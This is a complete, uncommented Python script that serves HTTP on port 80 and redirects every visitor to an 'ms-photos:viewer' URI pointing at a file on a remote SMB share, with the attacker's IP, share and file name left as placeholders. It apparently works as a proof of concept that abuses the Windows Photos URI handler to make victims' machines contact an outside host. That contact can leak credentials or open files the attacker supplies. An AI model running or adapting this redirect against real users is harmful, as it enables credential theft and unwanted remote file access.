from http.server import BaseHTTPRequestHandler, HTTPServer

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/favicon.ico":
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")
        else:
            self.send_response(302)  # Redirect everything else
            self.send_header('Location', 'ms-photos:viewer?fileName=\\\\<IP>\\<sharename>\\<filename>')
            self.end_headers()

if __name__ == "__main__":
    server_address = ("0.0.0.0", 80)
    httpd = HTTPServer(server_address, RedirectHandler)
    print("Server running at http://0.0.0.0:80")
    httpd.serve_forever()
